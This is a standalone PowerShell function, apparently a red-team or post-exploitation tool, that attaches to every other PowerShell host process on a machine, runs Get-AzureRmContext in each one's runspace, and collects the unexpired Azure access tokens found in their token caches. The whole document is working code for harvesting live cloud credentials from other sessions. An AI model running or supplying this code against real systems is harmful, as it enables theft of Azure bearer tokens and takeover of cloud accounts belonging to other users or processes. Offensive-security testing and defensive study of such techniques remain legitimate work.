function Extract-AzureJWTFromPowerShell {
    [CmdletBinding()]
    param()

    BEGIN{}

    PROCESS{
        Get-PSHostProcessInfo | Where-Object { $_.ProcessId -ne $pid } | % { 
            try
            {                             
                $processMessage ="Entering process {0} id {1}" -f $_.ProcessName, $_.ProcessId  
                Write-Verbose  $processMessage        
                Enter-PSHostProcess -Id $_.ProcessId
        
                $hostRS = Get-Runspace -Name PSAttachRunspace
                $script = @'
                            $azureContext = Get-AzureRmContext
                            $azureContext.TokenCache.ReadItems() | Where-object {$_.ExpiresOn -gt [System.DateTimeoffset]::Now.ToUniversalTime()}
'@

                [powershell]$psHost = [powershell]::Create()
                $psHost.Runspace = $hostRS
                $psHost.AddScript($script) | Out-null
                $tokenCollection += $psHost.Invoke()                 
            }
            catch
            {            
                Write-output $_.Exception.Message
            }
            finally
            {
                Exit-PSHostProcess -ErrorAction SilentlyContinue
                Get-Runspace PSAttachRunspace | % {$_.Close(); $_.Dispose()}
                $psHost.Dispose()

                $processMessage ="Exited process id {0}" -f $_.ProcessId  
                Write-Verbose  $processMessage   
            }

            if($tokenCollection) {$tokenCollection}       
        }
    }

    END{}
}
